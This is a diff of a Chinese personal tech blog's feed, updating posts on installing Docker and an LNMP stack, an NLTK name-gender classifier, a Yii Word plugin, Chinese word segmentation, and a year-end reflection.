-待安装环境：ubuntu+nginx+mysql+php
+待安装环境：ubuntu+nginx+mysql+php具体命令如下：
+
+$ sudo apt-get update   $ sudo apt-get install docker.io
 </code></pre>
 
-
-<p>具体命令如下：</p>
-
-<pre><code>$ sudo apt-get update
-$ sudo apt-get install docker.io
-</code></pre>
-
-
-<p>注意：如果使用操作系统自带包安装 Docker，目前安装的版本是比较旧的 0.9.1。 要安装更新的版本，可以通过使用 Docker 源的方式。</p>
-
-<p>通过Docker源安装最新版本</p>
-
-<p>要安装最新的 Docker 版本，首先需要安装 apt-transport-https 支持，之后通过添加源来安装。</p>
-
-<pre><code>$ sudo apt-get install apt-transport-https
-$ sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys    36A1D7869245C8950F966E92D8576A8BA88D21E9
-$ sudo bash -c "echo deb https://get.docker.io/ubuntu docker main > /etc/apt/sources.list.d/docker.list"
-$ sudo apt-get update
-$ sudo apt-get install lxc-docker
-</code></pre>
-
-
-<p>安装完成测试</p>
-
-<pre><code>$ sudo docker 
-</code></pre>
-
-
-<h4 id="toc_1">2. 安装镜像</h4>
-
-
-<p>采用从官方Docker Hub上安装。这里安装ubuntu 14.04</p>
-
-<pre><code>$ sudo docker pull ubuntu:14.04
-</code></pre>
-
-
-<p>删除镜像
-sudo images
-sudo docker rmi imagesname/imagesid
-如果提示错误，请先查看是否有container在运行，先删除container，然后再删除镜像；
-sudo docker ps -a
-sudo docker rm containername</p>
-
-<h4 id="toc_2">3. 安装lnmp环境</h4>
-
-
-<p>以ubuntu镜像作为基础镜像，启动容器并在其中执行 /bin/bash 命令， -t -i 参数用于创建交互式命令行;</p>
-
-<pre><code>$ sudo docker run -t -i ubuntu:14.04 /bin/bash
-</code></pre>
-
-
-<p>进入后就是跟平时的命令行差不多，具体命令参照 <a href="https://www.digitalocean.com/community/tutorials/how-to-install-linux-nginx-mysql-php-lemp-stack-on-ubuntu-14-04">digitalocean的详细指南</a></p>
-
-<p>查看容器的IP地址，并试着外部访问：</p>
-
-<pre><code>$ ifconfig
-</code></pre>
-
-
-<p>然后在外面用浏览器访问就可以看到网页内容了。</p>
+<p>注意：如果使用操作系统自带包安装 Docker，目前安装的版本是比较旧的 0.9.1。 要安装更新的版本，可以通过使用 Docker 源的方式。<!--more-->通过Docker源安装最新版本要安装最新的 Docker 版本，首先需要安装 apt-transport-https 支持，之后通过添加源来安装。
+    $ sudo apt-get install apt-transport-https  $ sudo apt-key adv &ndash;keyserver hkp://keyserver.ubuntu.com:80 &ndash;recv-keys    36A1D7869245C8950F966E92D8576A8BA88D21E9    $ sudo bash -c &ldquo;echo deb <a href="https://get.docker.io/ubuntu">https://get.docker.io/ubuntu</a> docker main > /etc/apt/sources.list.d/docker.list&rdquo;    $ sudo apt-get update   $ sudo apt-get install lxc-docker安装完成测试 $ sudo docker #### 2. 安装镜像采用从官方Docker Hub上安装。这里安装ubuntu  14.04    $ sudo docker pull ubuntu:14.04删除镜像sudo imagessudo docker rmi imagesname/imagesid如果提示错误，请先查看是否有container在运行，先删除container，然后再删除镜像；sudo docker ps -asudo docker rm containername#### 3. 安装lnmp环境以ubuntu镜像作为基础镜像，启动容器并在其中执行 /bin/bash 命令， -t -i 参数用于创建一个容器;
+    $ sudo docker run -t -i ubuntu:14.04 /bin/bash进入后就是跟平时的命令行差不多，具体命令参照 <a href="https://www.digitalocean.com/community/tutorials/how-to-install-linux-nginx-mysql-php-lemp-stack-on-ubuntu-14-04">digitalocean的详细指南</a>查看容器的IP地址，并试着外部访问：  $ ifconfig然后在外面用浏览器访问就可以看到网页内容了。</p>
 
 <p>退出容器和镜像</p>
 
 <pre><code>$ exit
+#### 4. 制作镜像查看目前的已有的容器：
+
+$ sudo docker ps -a可以看到刚刚操作的容器的名字，将刚刚修改的镜像打包，生成为新的镜像：   $ sudo docker commit 容器名字 ubuntu/lnmp删除原来旧容器和镜像 
+$ sudo docker rm 容器名字   $ sudo docker rmi 镜像id
 </code></pre>
 
-
-<h4 id="toc_3">4. 制作镜像</h4>
-
-
-<p>查看目前的已有的容器：</p>
-
-<pre><code>$ sudo docker ps -a
-</code></pre>
-
-
-<p>可以看到刚刚操作的容器的名字，将刚刚修改的镜像打包，生成为新的镜像：</p>
-
-<pre><code>$ sudo docker commit 容器名字 ubuntu/lnmp
-</code></pre>
-
-
-<p>删除原来旧容器和镜像</p>
-
-<pre><code>$ sudo docker rm 容器名字
-$ sudo docker rmi 镜像id
-</code></pre>
-
-
-<h4 id="toc_4">5. 总结</h4>
-
+<h4>5. 总结</h4>
 
 <p>详细步骤就上如下的操作，这个整体过程只是让我们更熟悉docker的相关命令，其实现在有更好的方法实现安装lnmp,例如可以直接在<a href="https://hub.docker.com/">docker hub</a>上面下载已经配置好的镜像，同时也可以通过 <a href="http://www.fig.sh/">Fig</a>来进行安装，下次我们接着写。</p>
 ]]></content>
@@ -887,76 +769,98 @@ $ sudo docker rmi 镜像id
   
   <entry>
     <title type="html"><![CDATA[2014年：瞎忙活的一年]]></title>
-    <link href="http://test.ourren.com/2015/01/01/2014%E5%B9%B4%EF%BC%9A%E7%9E%8E%E5%BF%99%E6%B4%BB%E7%9A%84%E4%B8%80%E5%B9%B4/"/>
+    <link href="http://test.ourren.com/2015/01/01/summary%20of%202014/"/>
     <updated>2015-01-01T00:00:00-08:00</updated>
-    <id>http://test.ourren.com/2015/01/01/2014年：瞎忙活的一年</id>
-    <content type="html"><![CDATA[<p>2013-2014是人生中迷茫的时期，需要面对生活的各个方面，需要考虑人生的道路方向。但我相信在这迷茫之后积极面对生活，充满热情迎接挑战时将会是另外一个天地。
-<span class="s1"><b>关于研究</b></span>
-<span class="s1">今年的研究工作就像题目一样：“瞎忙活”。推开客观情况而言，个人因素还是主要的，问题在于：个人研究方向未确定，就没有什么大的研究目标，所以一天只能看到眼前需要处理的事情和任务，你没有经常规划或者提醒你有一个长期的目标，就像迷茫在大海中的鱼，一天游呀游，不知道目的地在哪。因此，确定2015年个人的研究目标偏向于Web安全与隐私保护，机器学习与自然语言处理这块。</span>
-<span class="s1">改变以往对相关技术的研究方法，针对特定技术必须亲身实践并结合自己的理解输出技术文章，来改变原来写不出技术文章或者写出的技术文章水平很low。通过自己的文笔和理解写出来的代码和文章才是真正地掌握了该技术。</span>
-<span class="s1">在一个行业想要混得牛逼，自己必须得有一个擅长的技能，至少能够在这个领域排上名次，否则你没办法在这个圈子混，现代社会不缺少全才(什么方面都懂一点)，但是缺少专才(在某个技术点上做得很顶尖)，而目前最主要的目标就是需要在自己的领域证明自己的能力。</span>
-<span class="s1"><b>关于选择</b></span>
-<span class="s1">“选择比努力重要“其实这是今年很火的一句话，其实大家都知道这句话。但是为什么我们每个人在面对选择的时候都是那么迷茫，那么徘徊。因为我们没有任何经验和勇气去面对新的选择，我们害怕失败，害怕做了错误的选择。但是当我们无法决策的时候请拿下纸笔写下并对比，然后尽快做个选择，不要让这个问题一直纠结你的生活。同时我相信不管我们做了怎么样的选择，只要你勇于去面对，努力去实践，结果肯定不会差。</span>
-<span class="s1">其实从去年到今年一直在思考我到底做的选择对不对呢，到底哪条路才是对的。其实后来想通了才发现不要去纠结你已经做了的选择，你当时为什么做这个选择肯定有考虑，目前需要思考的就是在这个路上如何让自己走得更远，如何让自己能够在这个圈子混的更开。</span>
-<span class="s1"><b>关于自学</b></span>
-<span class="s1">其实自学不仅仅指书本学习，在现代社会中，你生活的方方面面(考试，技术或者学术研究，项目申请，租房、旅游等等)，这些问题不要去依靠别人给你回答，请记住“Google是你最好的老师”，而你的朋友只能给你建议，具体怎么做自己动手。特别是在发达国家，各种服务都是自助，自己不去花时间研究你就没办法生活。</span>
-<span class="s1">去年到今年申请公派项目可以说是深有体会，过程中经历了太多的曲折和难题。对于我而言付出了很多休息时间，但是通过自己的不断研究和努力，终于完成了这一年多的心愿，可以说在这个过程中学到了太多的东西，了解了原来没有接触过的太多东西，整个过程中可能出现的各种问题我算是全部经历了一遍。</span>
-<span class="s1">其实学习各类技术也是同样的道理，不要指望别人把方向和资料都给你安排好，然后你只要简单地操作就学到技术，不可能，永远不可能。一切都得靠你自己，看一下自己圈子的牛人，是不是大伙都是通过自学的。</span>
-<span class="s1"><b>关于幸福</b></span>
-<span class="s1">记得在网上经常看到一句话：“二十多岁的男人是人生的最低谷，没钱，没事业，而二十多岁的女孩是她一生最灿烂的时候，所以，年轻人要感谢你身边的女孩，更要学会珍惜！”，其实这句话写得真好。因为你这个年龄，在你事业或者人生的道路上会经历太多的迷茫和选择(工作、结婚、房子和孩子)，在现实与困难面前你会感到无助，感到世界会如此渺茫。一个奔三的男人能够有你喜爱的女孩陪伴在你的左右，在你孤单的时候送上问候，在你迷茫的时候跟你谈心，可以说他的生活是幸福的。因此，不要把幸福定义得太高，高得让你踮起脚都摸不到，让我们慢步走向幸福。</span>
-<span class="s1"><b>关于压力</b></span>
-<span class="s1">不要贪图没有压力的生活，也不要想什么时候压力会小点，人生活在这个社会，只有小时候无忧无虑，成年了每时每刻都有自己的压力，所以需要考虑的是面对压力我们该如何做，应该如果去处理，如何让自己生活好每一天。</span>
-<span class="s1"><b>关于2015</b></span></p>
+    <id>http://test.ourren.com/2015/01/01/summary of 2014</id>
+    <content type="html"><![CDATA[<p>2013-2014是人生中迷茫的时期，需要面对生活的各个方面，需要考虑人生的道路方向。但我相信在这迷茫之后积极面对生活，充满热情迎接挑战时将会是另外一个天地。</p>
 
-<ol class="ol1">
-    <li class="li1"><span class="s1">拿到驾照；</span></li>
-    <li class="li1"><span class="s1">完成高水平论文2篇；</span></li>
-    <li class="li1"><span class="s1">在研究领域有一定影响力；</span></li>
-    <li class="li1"><span class="s1">参加国际比赛并拿到名次；</span></li>
-    <li class="li1"><span class="s1">解决终生大事。</span></li>
+<h4>关于研究</h4>
+
+<p>今年的研究工作就像题目一样：“瞎忙活”。推开客观情况而言，个人因素还是主要的，问题在于：个人研究方向未确定，就没有什么大的研究目标，所以一天只能看到眼前需要处理的事情和任务，你没有经常规划或者提醒你有一个长期的目标，就像迷茫在大海中的鱼，一天游呀游，不知道目的地在哪。因此，确定2015年个人的研究目标偏向于Web安全与隐私保护，机器学习与自然语言处理这块。</p>
+
+<p>改变以往对相关技术的研究方法，针对特定技术必须亲身实践并结合自己的理解输出技术文章，来改变原来写不出技术文章或者写出的技术文章水平很low。通过自己的文笔和理解写出来的代码和文章才是真正地掌握了该技术。</p>
+
+<p>在一个行业想要混得牛逼，自己必须得有一个擅长的技能，至少能够在这个领域排上名次，否则你没办法在这个圈子混，现代社会不缺少全才(什么方面都懂一点)，但是缺少专才(在某个技术点上做得很顶尖)，而目前最主要的目标就是需要在自己的领域证明自己的能力。</p>
+
+<!--more-->
+
+
+<h4>关于选择</h4>
+
+<p>“选择比努力重要“其实这是今年很火的一句话，其实大家都知道这句话。但是为什么我们每个人在面对选择的时候都是那么迷茫，那么徘徊。因为我们没有任何经验和勇气去面对新的选择，我们害怕失败，害怕做了错误的选择。但是当我们无法决策的时候请拿下纸笔写下并对比，然后尽快做个选择，不要让这个问题一直纠结你的生活。同时我相信不管我们做了怎么样的选择，只要你勇于去面对，努力去实践，结果肯定不会差。</p>
+
+<p>其实从去年到今年一直在思考我到底做的选择对不对呢，到底哪条路才是对的。其实后来想通了才发现不要去纠结你已经做了的选择，你当时为什么做这个选择肯定有考虑，目前需要思考的就是在这个路上如何让自己走得更远，如何让自己能够在这个圈子混的更开。</p>
+
+<h4>关于自学</h4>
+
+<p>其实自学不仅仅指书本学习，在现代社会中，你生活的方方面面(考试，技术或者学术研究，项目申请，租房、旅游等等)，这些问题不要去依靠别人给你回答，请记住“Google是你最好的老师”，而你的朋友只能给你建议，具体怎么做自己动手。特别是在发达国家，各种服务都是自助，自己不去花时间研究你就没办法生活。</p>
+
+<p>去年到今年申请公派项目可以说是深有体会，过程中经历了太多的曲折和难题。对于我而言付出了很多休息时间，但是通过自己的不断研究和努力，终于完成了这一年多的心愿，可以说在这个过程中学到了太多的东西，了解了原来没有接触过的太多东西，整个过程中可能出现的各种问题我算是全部经历了一遍。</p>
+
+<p>其实学习各类技术也是同样的道理，不要指望别人把方向和资料都给你安排好，然后你只要简单地操作就学到技术，不可能，永远不可能。一切都得靠你自己，看一下自己圈子的牛人，是不是大伙都是通过自学的。</p>
+
+<h4>关于幸福</h4>
+
+<p>记得在网上经常看到一句话：“二十多岁的男人是人生的最低谷，没钱，没事业，而二十多岁的女孩是她一生最灿烂的时候，所以，年轻人要感谢你身边的女孩，更要学会珍惜！”，其实这句话写得真好。因为你这个年龄，在你事业或者人生的道路上会经历太多的迷茫和选择(工作、结婚、房子和孩子)，在现实与困难面前你会感到无助，感到世界会如此渺茫。一个奔三的男人能够有你喜爱的女孩陪伴在你的左右，在你孤单的时候送上问候，在你迷茫的时候跟你谈心，可以说他的生活是幸福的。因此，不要把幸福定义得太高，高得让你踮起脚都摸不到，让我们慢步走向幸福。</p>
+
+<h4>关于压力</h4>
+
+<p>不要贪图没有压力的生活，也不要想什么时候压力会小点，人生活在这个社会，只有小时候无忧无虑，成年了每时每刻都有自己的压力，所以需要考虑的是面对压力我们该如何做，应该如果去处理，如何让自己生活好每一天。</p>
+
+<h4>关于2015</h4>
+
+<ol>
+<li>拿到驾照；</li>
+<li>完成高水平论文2篇；</li>
+<li>在研究领域有一定影响力；</li>
+<li>参加国际比赛并拿到名次；</li>
+<li>解决终生大事。</li>
 </ol>
 
 
-<p><span class="s1"><b>关于其他</b></span>
-<span class="s1">今年自从买了kpw，天天挤公交的时候刷了13+本书，抽周末和平时晚上刷了40＋(美剧＋电影)，SecWiki提交了2800＋精品安全资讯和专题，同时SecWiki用户过1000+&hellip;..</span>
-<span class="s1">为什么开始写年终总结，因此我想记录下来，让我的心里能够放松，让我的心里装着目标，让我能够时刻提醒自己心中的任务，让我能够不断向前冲。</span></p>
+<h4>关于其他</h4>
+
+<p>今年自从买了kpw，天天挤公交的时候刷了13+本书，抽周末和平时晚上刷了40＋(美剧＋电影)，SecWiki提交了2800＋精品安全资讯和专题，同时SecWiki用户过1000+&hellip;..</p>
+
+<p>为什么开始写年终总结，因此我想记录下来，让我的心里能够放松，让我的心里装着目标，让我能够时刻提醒自己心中的任务，让我能够不断向前冲。</p>
 ]]></content>
   </entry>
   
   <entry>
     <title type="html"><![CDATA[NLP入门实例:判断性别]]></title>
-    <link href="http://test.ourren.com/2014/12/26/nlp%E5%85%A5%E9%97%A8%E5%AE%9E%E4%BE%8B%E5%88%A4%E6%96%AD%E6%80%A7%E5%88%AB/"/>
+    <link href="http://test.ourren.com/2014/12/26/nlp%20with%20sex%20for%20beginners/"/>
     <updated>2014-12-26T00:00:00-08:00</updated>
-    <id>http://test.ourren.com/2014/12/26/nlp入门实例判断性别</id>
-    <content type="html"><![CDATA[<p><img class=" aligncenter" src="http://ourren.b0.upaiyun.com/supervised-classification.png" alt="image"></p>
+    <id>http://test.ourren.com/2014/12/26/nlp with sex for beginners</id>
+    <content type="html"><![CDATA[<p><img src="http://ourren.b0.upaiyun.com/supervised-classification.png" alt="image" /></p>
 
 <h4>1. NLP(Natural Language Processing)</h4>
-
 
 <p>自然语言处理(NLP)是人工智能和语言学领域的重要学科，在这此领域中探讨如何处理及运用自然语言；自然语言认知则是指让电脑“懂”人类的语言。自然语言生成系统把计算机数据转化为自然语言。自然语言理解系统把自然语言转化为计算机程序更易于处理的形式[1]。</p>
 
 <p>按照我个人的理解就是计算机怎么去理解并处理文字(中文或者其他语言)，因为每种语言都有各种语法，语义和感情色彩等。而计算机他是不懂感情的，学过计算机编程的都知道，不管是x64/X86的机器上面跑的就是0101。而NLP技术的出现就是来解决该类问题，NLP主要难点在于:</p>
 
 <ul>
-    <li>单词的边界界定(注:分词)
+<li><p>单词的边界界定(注:分词)</p>
 
-在口语中，词与词之间通常是连贯的，而界定字词边界通常使用的办法是取用能让给定的上下文最为通顺且在文法上无误的一种最佳组合。在书写上，汉语也没有词与词之间的边界。</li>
-    <li>词义的消歧(注:语义)
+<p>  在口语中，词与词之间通常是连贯的，而界定字词边界通常使用的办法是取用能让给定的上下文最为通顺且在文法上无误的一种最佳组合。在书写上，汉语也没有词与词之间的边界。</p></li>
+<li><p>词义的消歧(注:语义)</p>
 
-许多字词不单只有一个意思，因而我们必须选出使句意最为通顺的解释。</li>
-    <li>句法的模糊性(注:语境)
+<p>  许多字词不单只有一个意思，因而我们必须选出使句意最为通顺的解释。</p></li>
+<li><p>句法的模糊性(注:语境)</p>
 
-自然语言的文法通常是模棱两可的，针对一个句子通常可能会剖析（Parse）出多棵剖析树（Parse Tree），而我们必须要仰赖语意及前后文的资讯才能在其中选择一棵最为适合的剖析树。</li>
-    <li>有瑕疵的或不规范的输入
+<p>  自然语言的文法通常是模棱两可的，针对一个句子通常可能会剖析（Parse）出多棵剖析树（Parse Tree），而我们必须要仰赖语意及前后文的资讯才能在其中选择一棵最为适合的剖析树。</p></li>
+<li><p>有瑕疵的或不规范的输入</p>
 
-例如语音处理时遇到外国口音或地方口音，或者在文本的处理中处理拼写，语法或者光学字符识别（OCR）的错误。</li>
+<p>  例如语音处理时遇到外国口音或地方口音，或者在文本的处理中处理拼写，语法或者光学字符识别（OCR）的错误。</p></li>
 </ul>
 
 
 <p>本文不会涉及太多这块技术，一方面我也刚入门，另外一方面这块技术比较高深，是一个长期需要研究的东西。</p>
 
-<h4>2. 问题的提出</h4>
+<!--more-->
 
+
+<h4>2. 问题的提出</h4>
 
 <p>我们都知道日常生活中一个人的名字跟他的性别还是有一定的关系。例如一个名字叫作小红的人，大部分人都会认为她应该是女性，因此，一个人的姓名跟他的性别是有一定关系的，在生活中我们可以根据别人的姓名去猜测他的性别，当然这有一定的几率，但是如何编写程序让计算机也能进行判定，这个就是一个基本的NLP技术的应用范围。</p>
 
@@ -964,14 +868,13 @@ $ sudo docker rmi 镜像id
 
 <h4>3. NLP相关技术</h4>
 
-
 <p>目前国内外对NLP相关技术研究资料很多，国内主要研究具体技术有中文的分词，词性标注、实体识别、句块分析、语义分析，情感分析，分类算法的优化等，相比英文，中文的复杂程度比较高，涉及到一词多义，语句中的顺序和语义中的多种否定和语境。目前应用场景主要有：</p>
 
 <ol>
-    <li>语义的感情分析，包含帖子，微博或者文章等。将语句分为：消极、积极和中性。涉及到公司或者产品舆情，用于对于商品的评价分析；</li>
-    <li>主题的关键字提取，也即观点提取或者主题的标签提取，经常逛<a href="https://v2ex.com">v2ex</a>的就知道它目前也是使用的自动标签；</li>
-    <li>搜索引擎与个性推荐，根据已有数据预测未知数据或者推荐类似商品；</li>
-    <li>其它我不知道的。</li>
+<li>语义的感情分析，包含帖子，微博或者文章等。将语句分为：消极、积极和中性。涉及到公司或者产品舆情，用于对于商品的评价分析；</li>
+<li>主题的关键字提取，也即观点提取或者主题的标签提取，经常逛<a href="https://v2ex.com">v2ex</a>的就知道它目前也是使用的自动标签；</li>
+<li>搜索引擎与个性推荐，根据已有数据预测未知数据或者推荐类似商品；</li>
+<li>其它我不知道的。</li>
 </ol>
 
 
@@ -979,15 +882,14 @@ $ sudo docker rmi 镜像id
 
 <h4>4. 环境搭建</h4>
 
-
 <p>首先安装nltk库：</p>
 
 <ol>
-    <li>先安装easy_install: http://pypi.python.org/pypi/setuptools</li>
-    <li>安装Pip: run sudo easy_install pip</li>
-    <li>安装 Numpy (可选): run sudo pip install -U numpy</li>
-    <li>安装 NLTK: run sudo pip install -U nltk</li>
-    <li>测试是否成功: run python then type import nltk</li>
+<li>先安装easy_install: <a href="http://pypi.python.org/pypi/setuptools">http://pypi.python.org/pypi/setuptools</a></li>
+<li>安装Pip: run sudo easy_install pip</li>
+<li>安装 Numpy (可选): run sudo pip install -U numpy</li>
+<li>安装 NLTK: run sudo pip install -U nltk</li>
+<li>测试是否成功: run python then type import nltk</li>
 </ol>
 
 
@@ -999,22 +901,20 @@ $ sudo docker rmi 镜像id
 nltk.download()
 </code></pre>
 
-
 <p>在弹出的下载界面选择需要安装的文件进行安装。</p>
 
 <h4>5.具体流程</h4>
 
-
 <p>本次我们采用贝叶斯分类算法对该问题进行分析，具体的流程图见文章顶部的图片，在进行分类前需要解决如下问题：</p>
 
 <ol>
-    <li>原始标注数据，即训练数据；
+<li><p>原始标注数据，即训练数据；</p>
 
-由于本次属于试验测试阶段，因此前期样本选取不用过大，可以采用手工标注方法进行标注。</li>
-    <li>特征提取算法，即一个人的姓名跟性别到底有什么关系。
+<p> 由于本次属于试验测试阶段，因此前期样本选取不用过大，可以采用手工标注方法进行标注。</p></li>
+<li><p>特征提取算法，即一个人的姓名跟性别到底有什么关系。</p>
 
-本次由于只是演示nlp的作用和流程，因此可以简化提取特征，我们假定其实性别跟姓名的最后一个字母有关系。但是在实际的情况下涉及的方面实在太多，这个也是需要研究的一个内容。看下如下别人设计的一个模型：<img src="http://ourren.b0.upaiyun.com/map-nlp-seduction.gif" alt="image">
-</li>
+<p> 本次由于只是演示nlp的作用和流程，因此可以简化提取特征，我们假定其实性别跟姓名的最后一个字母有关系。但是在实际的情况下涉及的方面实在太多，这个也是需要研究的一个内容。看下如下别人设计的一个模型：
+ <img src="http://ourren.b0.upaiyun.com/map-nlp-seduction.gif" alt="image" /></p></li>
 </ol>
 
 
@@ -1022,13 +922,11 @@ nltk.download()
 
 <h4>6.代码实现</h4>
 
-
 <p>本次采用python语言进行开发，特征提取函数如下：</p>
 
 <pre><code>def gender_features(word):
     return {'last_letter':word[-1]}
 </code></pre>
-
 
 <p>训练数据从网上英文取名网站提取。</p>
 
@@ -1051,7 +949,6 @@ Alina
 Alison
 </code></pre>
 
-
 <p>男孩姓名数据：</p>
 
 <pre><code>abbott
@@ -1066,7 +963,6 @@ afton
 aidric
 aiken
 </code></pre>
-
 
 <p>程序全部代码：</p>
 
@@ -1085,16 +981,14 @@ classifier = nltk.NaiveBayesClassifier.train(train_set)
 print classifier.classify(gender_features('ourren'))
 </code></pre>
 
-
 <p>基本上实现了本文提出的问题，其实该问题就是nltk入门书籍上的一个题目。</p>
 
 <h4>参考</h4>
 
-
 <ol>
-    <li><a href="http://zh.wikipedia.org/wiki/%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86">自然语言处理</a></li>
-    <li><a href="http://www.nltk.org/">Natural Language Toolkit</a></li>
-    <li><a href="http://www.nltk.org/book/ch06.html">Learning to Classify Text</a></li>
+<li><a href="http://zh.wikipedia.org/wiki/%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86">自然语言处理</a></li>
+<li><a href="http://www.nltk.org/">Natural Language Toolkit</a></li>
+<li><a href="http://www.nltk.org/book/ch06.html">Learning to Classify Text</a></li>
 </ol>
 
 ]]></content>
@@ -1102,9 +996,9 @@ print classifier.classify(gender_features('ourren'))
   
   <entry>
     <title type="html"><![CDATA[Yii框架使用Word扩展插件]]></title>
-    <link href="http://test.ourren.com/2014/11/02/yii-wordyii%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8word%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6/"/>
+    <link href="http://test.ourren.com/2014/11/02/yii-word%20extension%20and%20example/"/>
     <updated>2014-11-02T00:00:00-07:00</updated>
-    <id>http://test.ourren.com/2014/11/02/yii-wordyii框架使用word扩展插件</id>
+    <id>http://test.ourren.com/2014/11/02/yii-word extension and example</id>
     <content type="html"><![CDATA[<p><img class="aligncenter" src="http://ourren.b0.upaiyun.com/yii_word.png" alt="" width="374" height="141"></p>
 
 <p>MS Office套件的复合文件格式（特别是Word和PPT）一直是编程人员比较恼火的问题：不能通过简单的编程来自动生成Word或者PPT文件，但是从Office 2007开始微软逐渐开放其格式（可以理解未：单一的Office文件相当于一个zip的压缩包，其文件的内容可以通过编程来修改），因此诞生了基于各种脚本语言的office库。现在看来其具体实现的方法有如下几种：</p>
@@ -1174,9 +1068,9 @@ $section->addTextBreak();//添加空行
   
   <entry>
     <title type="html"><![CDATA[中文分词与词频统计实例]]></title>
-    <link href="http://test.ourren.com/2014/09/24/%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E4%B8%8E%E8%AF%8D%E9%A2%91%E7%BB%9F%E8%AE%A1%E5%AE%9E%E4%BE%8B/"/>
+    <link href="http://test.ourren.com/2014/09/24/chinese%20token%20and%20frequency/"/>
     <updated>2014-09-24T00:00:00-07:00</updated>
-    <id>http://test.ourren.com/2014/09/24/中文分词与词频统计实例</id>
+    <id>http://test.ourren.com/2014/09/24/chinese token and frequency</id>
     <content type="html"><![CDATA[<p><img class="aligncenter" src="http://blog.ourren.com/blog/jieba_tu.png" alt="" width="532" height="463"></p>
 
 <p>话说近两年大数据确实火了，带给我们最直接的视觉感受就是利用图或者表来展示大数据所隐藏的内容，真是真实而又直观。然而技术博客的侧边栏标签云就是一种原始雏形，只不过这种标签是通过作者手动添加而生成的。本文就是想通过自动提取博文标题中的关键字，然后通过插件来进行显示。核心技术就是：中文分词与词频统计。</p>
@@ -1270,9 +1164,9 @@ print &#8220;%s:&#8221; % word,cnt</blockquote>
   
   <entry>
     <title type="html"><![CDATA[线下积分联盟的十问十答]]></title>
-    <link href="http://test.ourren.com/2014/08/31/%E7%BA%BF%E4%B8%8B%E7%A7%AF%E5%88%86%E8%81%94%E7%9B%9F%E7%9A%84%E5%8D%81%E9%97%AE%E5%8D%81%E7%AD%94/"/>
+    <link href="http://test.ourren.com/2014/08/31/two%20questions%20about%20o2o%20point/"/>
     <updated>2014-08-31T00:00:00-07:00</updated>
-    <id>http://test.ourren.com/2014/08/31/线下积分联盟的十问十答</id>
+    <id>http://test.ourren.com/2014/08/31/two questions about o2o point</id>
     <content type="html"><![CDATA[<p><img class="aligncenter" src="http://blog.ourren.com/blog/o2ojifen.jpg" alt="" width="512" height="219"></p>
 
 <p>前几天跟一个创业的年轻人聊天，无意中谈到了他正在做的<strong>创业项目</strong>，其它他当时也只是描述一种模式：生活在中我们经常在小卖部或者店铺直接购买商品，这种购买方式不同于网络购物（后者可以在支付宝或者京东或者腾讯上积分，然后用积分换取RMB），他们想做的就是让用户在现金购物的时候进行积分，从而实现线下积分。但是我感觉用六个字就可以概括：<strong>线下积分联盟</strong>。</p>
@@ -1359,7 +1253,7 @@ print &#8220;%s:&#8221; % word,cnt</blockquote>
 </ol>
 
 
-<p>如何任何问题欢迎留言或者<span style="color: #000000;">微博： <a style="color: #cccccc;" href="http://t.qq.com/secwiki" target="_blank"><span style="color: #000000;">@腾讯微博</span></a> <a style="color: #cccccc;" href="http://weibo.com/secwiki" target="_blank"><span style="color: #000000;">@新浪微博</span></a></span><br style="color: #a4a1a1;"><span style="color: #000000;">意见反馈QQ群：295202941</span><br style="color: #a4a1a1;"><span style="color: #000000;">联系邮件：<a href="&#109;&#x61;&#105;&#108;&#116;&#111;&#58;&#83;&#x65;&#x63;&#x57;&#105;&#x6b;&#x69;&#x40;&#113;&#x71;&#x2e;&#x63;&#111;&#109;">&#x53;&#x65;&#99;&#x57;&#105;&#107;&#105;&#64;&#x71;&#113;&#46;&#99;&#111;&#109;</a></span></p>
+<p>如何任何问题欢迎留言或者<span style="color: #000000;">微博： <a style="color: #cccccc;" href="http://t.qq.com/secwiki" target="_blank"><span style="color: #000000;">@腾讯微博</span></a> <a style="color: #cccccc;" href="http://weibo.com/secwiki" target="_blank"><span style="color: #000000;">@新浪微博</span></a></span><br style="color: #a4a1a1;"><span style="color: #000000;">意见反馈QQ群：295202941</span><br style="color: #a4a1a1;"><span style="color: #000000;">联系邮件：<a href="&#109;&#97;&#105;&#108;&#116;&#111;&#x3a;&#x53;&#101;&#99;&#x57;&#105;&#107;&#105;&#64;&#x71;&#x71;&#x2e;&#x63;&#111;&#x6d;">&#83;&#x65;&#x63;&#x57;&#105;&#x6b;&#x69;&#64;&#x71;&#x71;&#46;&#x63;&#x6f;&#109;</a></span></p>
 ]]></content>
   </entry>
   
